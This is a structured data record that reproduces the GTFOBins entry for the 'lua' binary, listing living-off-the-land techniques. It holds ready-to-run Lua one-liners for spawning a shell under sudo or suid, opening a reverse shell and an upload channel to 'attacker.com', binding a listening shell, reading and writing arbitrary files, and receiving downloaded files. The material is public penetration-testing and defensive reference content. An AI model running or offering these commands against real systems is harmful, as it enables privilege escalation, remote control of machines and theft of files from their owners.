- title: "GTFOBins lua"
  service: linux
  tech: lolbin
  doc_kind: gtfobins
  content: |-
    ## GTFOBins: lua
    Living-off-the-land techniques for the `lua` binary (GTFOBins, MIT).

    ### shell
    ```
    lua -e 'os.execute("/bin/sh")'
    ```
    _contexts: sudo, suid, unprivileged_

    ### reverse-shell
    ```
    lua -e '
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect("attacker.com",12345);
      while true do
        local r,x=t:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));t:send(b);
      end;
      f:close();t:close();'
    ```
    _contexts: sudo, suid, unprivileged_
    This requires `lua-socket` to be available.

    ### bind-shell
    ```
    lua -e '
      local k=require("socket");
      local s=assert(k.bind("*",12345));
      local c=s:accept();
      while true do
        local r,x=c:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));c:send(b);
      end;c:close();f:close();'
    ```
    _contexts: sudo, suid, unprivileged_
    This requires `lua-socket` to be available.

    ### file-read
    ```
    lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
    ```
    _contexts: sudo, suid, unprivileged_

    ### file-write
    ```
    lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
    ```
    _contexts: sudo, suid, unprivileged_

    ### download
    ```
    lua -e '
      local k=require("socket");
      local s=assert(k.bind("*",12345));
      local c=s:accept();
      local d,x=c:receive("*a");
      c:close();
      local f=io.open("/path/to/output-file", "wb");
      f:write(d);
      io.close(f);'
    ```
    _contexts: sudo, suid, unprivileged_
    This requires `lua-socket` to be available.

    ### upload
    ```
    lua -e '
      local f=io.open("/path/to/input-file", "rb")
      local d=f:read("*a")
      io.close(f);
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect("attacker.com",12345);
      t:send(d);
      t:close();'
    ```
    _contexts: sudo, suid, unprivileged_
    This requires `lua-socket` to be available.
